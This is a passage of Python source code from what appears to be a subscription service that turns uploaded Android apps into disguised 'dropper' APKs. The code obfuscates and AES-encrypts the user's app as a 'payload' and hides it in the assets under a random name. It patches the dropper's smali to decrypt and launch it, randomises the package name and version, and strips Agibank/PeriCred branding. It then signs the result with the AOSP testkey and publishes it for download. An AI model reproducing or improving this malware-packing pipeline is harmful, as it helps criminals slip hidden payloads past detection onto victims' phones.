        if not os.path.isfile(key_pk8) or not os.path.isfile(cert_pem):
            raise RuntimeError("AOSP testkey ausente (signing/testkey.pk8 + testkey.x509.pem).")
        cmd.extend(["--key", key_pk8, "--cert", cert_pem])
    elif keystore_path:
        cmd.extend(
            [
                "--ks",
                keystore_path,
                "--ks-pass",
                f"pass:{store_pass}",
                "--ks-key-alias",
                key_alias,
                "--key-pass",
                f"pass:{key_pass}",
            ]
        )
    else:
        raise RuntimeError("Nenhum material de assinatura configurado.")
    cmd.append(aligned_apk)
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=120, env=java_env()
    )
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "apksigner falhou").strip()
        raise RuntimeError(f"Falha na assinatura: {err[:300]}")
    return output_apk


def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
    mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
    if mode == "aosp_testkey":
        return sign_with_apksigner(
            aligned_apk,
            output_apk,
            key_pk8=Config.AOSP_TESTKEY_PK8,
            cert_pem=Config.AOSP_TESTKEY_CERT,
        )
    keystore_path, store_pass, key_alias, key_pass = ensure_release_keystore()
    return sign_with_apksigner(
        aligned_apk,
        output_apk,
        keystore_path=keystore_path,
        store_pass=store_pass,
        key_alias=key_alias,
        key_pass=key_pass,
    )


def process_apk(
    build_id,
    user_apk_path,
    custom_app_name,
    username,
    custom_icon_path=None,
    persist=True,
    portal="subscriber",
):
    BUILD_STATUS[build_id] = {
        "status": "Iniciando...",
        "progress": 0,
        "portal": portal,
        "owner": username,
        "ephemeral": not persist,
    }

    try:
        if not JAVA_BIN:
            raise RuntimeError("Java nao encontrado. Instale OpenJDK 17+ ou defina JAVA_HOME.")

        if persist:
            add_build_history(username, custom_app_name, "processando", build_id)
        _set_status(
            build_id,
            "Extraindo APK...",
            15,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )

        user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
        if os.path.exists(user_apk_extracted):
            shutil.rmtree(user_apk_extracted)
        os.makedirs(user_apk_extracted, exist_ok=True)

        try:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                zip_ref.extractall(user_apk_extracted)
        except Exception:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                for member in zip_ref.namelist():
                    try:
                        zip_ref.extract(member, user_apk_extracted)
                    except Exception:
                        pass

        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
            _set_status(build_id, "Extraindo arquivos...", 20)
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f',
                shell=True,
            )

        _set_status(build_id, "Preparando Dropper", 30)
        dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
        if os.path.exists(dropper_work):
            shutil.rmtree(dropper_work)
        def _template_ignore(dirpath, names):
            if os.path.abspath(dirpath) == os.path.abspath(Config.DROPPER_TEMPLATE):
                return [n for n in names if n in ("prebuilt", "build", "original")]
            return []

        shutil.copytree(Config.DROPPER_TEMPLATE, dropper_work, ignore=_template_ignore)

        app_name = custom_app_name if custom_app_name else "App"
        new_package = generate_package_name(app_name)

        major = random.randint(*Config.VERSION_NAME_MAJOR)
        minor = random.randint(0, 9)
        patch = random.randint(0, 9)
        version_name = f"{major}.{minor}.{patch}"
        version_code = Config.VERSION_CODE_BASE + random.randint(1, 40)
        apply_version_info(dropper_work, version_name, version_code)

        _set_status(build_id, "Configurando aplicativo...", 35)
        apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)

        if custom_icon_path and os.path.exists(custom_icon_path):
            for density in [
                "res/mipmap-hdpi",
                "res/mipmap-mdpi",
                "res/mipmap-xhdpi",
                "res/mipmap-xxhdpi",
                "res/mipmap-xxxhdpi",
                "res/mipmap-anydpi-v26",
            ]:
                path = os.path.join(dropper_work, density)
                if not os.path.isdir(path) and density.endswith("anydpi-v26"):
                    continue
                os.makedirs(path, exist_ok=True)
                for xml_name in ("ic_launcher.xml", "ic_launcher_round.xml"):
                    xml_path = os.path.join(path, xml_name)
                    if os.path.isfile(xml_path):
                        os.remove(xml_path)
                if density.endswith("anydpi-v26"):
                    try:
                        if not os.listdir(path):
                            os.rmdir(path)
                    except OSError:
                        pass
                    continue
                for name in ("ic_launcher.png", "ic_launcher_round.png"):
                    shutil.copy2(custom_icon_path, os.path.join(path, name))

        strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
        if os.path.exists(strings_xml):
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                for string_node in root.findall("string"):
                    name = string_node.get("name")
                    if name == "app_name":
                        string_node.text = app_name
                    elif name == "app_description" and string_node.text:
                        string_node.text = (
                            f"{app_name} — gerenciador corporativo de aplicativos."
                        )
                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
            except Exception:
                pass

        for root_dir, _, files in os.walk(dropper_work):
            for file in files:
                if file.endswith((".smali", ".xml")):
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
                            content = fh.read()
                        new_content = (
                            content.replace("PeriCred", app_name)
                            .replace("Agibank", app_name)
                            .replace("AgiBank", app_name)
                        )
                        if content != new_content:
                            with open(file_path, "w", encoding="utf-8") as fh:
                                fh.write(new_content)
                    except Exception:
                        pass

        _set_status(build_id, "Preparando payload", 50)
        prepared_apk, launch_class = prepare_payload(
            user_apk_path,
            Config.UPLOAD_FOLDER,
            build_id,
        )

        _set_status(build_id, "Ofuscando payload", 55)
        with open(prepared_apk, "rb") as fh:
            payload_data = fh.read()
        payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
        payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)

        _set_status(build_id, "Injetando Payload", 60)
        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        asset_name = random.choice(Config.ASSET_NAME_POOL)
        out_name = f"index_{secrets.token_hex(2)}.pak"
        ciphertext = encrypt_aes_ctr(payload_data, key, iv)

        roundtrip = decrypt_aes_ctr(ciphertext, key, iv)
        if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
            raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
        if roundtrip != payload_data:
            raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")

        assets_dir = os.path.join(dropper_work, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        for stale in os.listdir(assets_dir):
            stale_path = os.path.join(assets_dir, stale)
            if os.path.isfile(stale_path):
                os.remove(stale_path)
        payload_path = os.path.join(assets_dir, asset_name)
        with open(payload_path, "wb") as fh:
            fh.write(ciphertext)

        patch_vd_crypto_smali(
            dropper_work,
            asset_name=asset_name,
            out_name=out_name,
            key=key,
            iv=iv,
            cipher=Config.CIPHER_TRANSFORM,
        )

        payload_package = extract_apk_package_name(prepared_apk)
        bind_target_package(dropper_work, payload_package)
        patch_w_explicit_launch(dropper_work, launch_class)
        print(
            f"[build {build_id}] target_pkg bound -> {payload_package} "
            f"launch_class={launch_class}"
        )

        _set_status(build_id, "Compilando APK", 80)
        unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")

        if not os.path.exists(Config.APKTOOL_JAR):
            raise RuntimeError("Ferramenta de compilacao nao encontrada.")

        res_b = subprocess.run(
            f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
            shell=True,
            capture_output=True,
            text=True,
        )
        if not os.path.exists(unsigned_apk):
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" empty-framework-dir',
                shell=True,
            )
            res_b = subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
                shell=True,
                capture_output=True,
                text=True,
            )
            if not os.path.exists(unsigned_apk):
                err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                raise RuntimeError(f"Erro na compilacao: {err[:500]}")

        if getattr(Config, "INJECT_SECONDARY_DEX", False):
            _set_status(build_id, "Empacotando bibliotecas", 85)
            inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)

        _set_status(build_id, "Restaurando unknown/", 86)
        n_unknown = inject_unknown_into_apk(unsigned_apk, dropper_work)
        print(f"[build {build_id}] unknown/ restored: {n_unknown} entries")

        _set_status(build_id, "Normalizando timestamps", 87)
        normalize_apk_zip_timestamps(unsigned_apk)

        _set_status(build_id, "Assinando APK", 90)
        output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
        os.makedirs(output_dir, exist_ok=True)

        if not os.path.isfile(Config.APKSIGNER) or not os.path.isfile(Config.ZIPALIGN):
            raise RuntimeError(
                "apksigner/zipalign nao encontrados. Verifique APP-TEST/tools/android-sdk/."
            )

        aligned_apk = os.path.join(output_dir, f"{build_id}_aligned.apk")
        signed_apk = os.path.join(output_dir, "app-release.apk")
        final_apk = None

        try:
            zipalign_apk(unsigned_apk, aligned_apk)
            final_apk = sign_release_apk(aligned_apk, signed_apk)
        finally:
            if os.path.exists(aligned_apk):
                os.remove(aligned_apk)
            if os.path.exists(unsigned_apk):
                try:
                    os.remove(unsigned_apk)
                except OSError:
                    pass

        if not final_apk or not os.path.isfile(final_apk):
            raise RuntimeError("Assinatura nao produziu APK final.")

        final_name = f"{secure_filename(app_name)}.apk"
        shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
        BUILD_STATUS[build_id] = {
            "status": "Concluido",
            "progress": 100,
            "output_file": final_name,
            "portal": portal,
            "owner": username,
            "ephemeral": not persist,
        }
        if persist:
            add_build_history(username, custom_app_name, "concluido", build_id, final_name)
            update_amplification(username, "concluido")
            add_history(username, "Build APK", f"App: {app_name}", portal=portal)
            from services.public_app_service import register_public_download

            register_public_download(
                build_id=build_id,
                app_name=app_name,
                output_file=final_name,
                icon_path=custom_icon_path,
            )

    except Exception as exc:
        import traceback

        tb = traceback.format_exc()
        print(f"ERRO NO BUILD {build_id}: {exc}\n{tb}")
        detail = str(exc).strip().replace("\n", " ")
        if len(detail) > 180:
            detail = detail[:177] + "..."
        _set_status(
            build_id,
            f"Erro no processamento. Tente novamente. ({detail})" if detail else "Erro no processamento. Tente novamente.",
            0,
            error=True,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )
        if persist:
            add_build_history(username, custom_app_name, "erro", build_id)
            update_amplification(username, "erro")








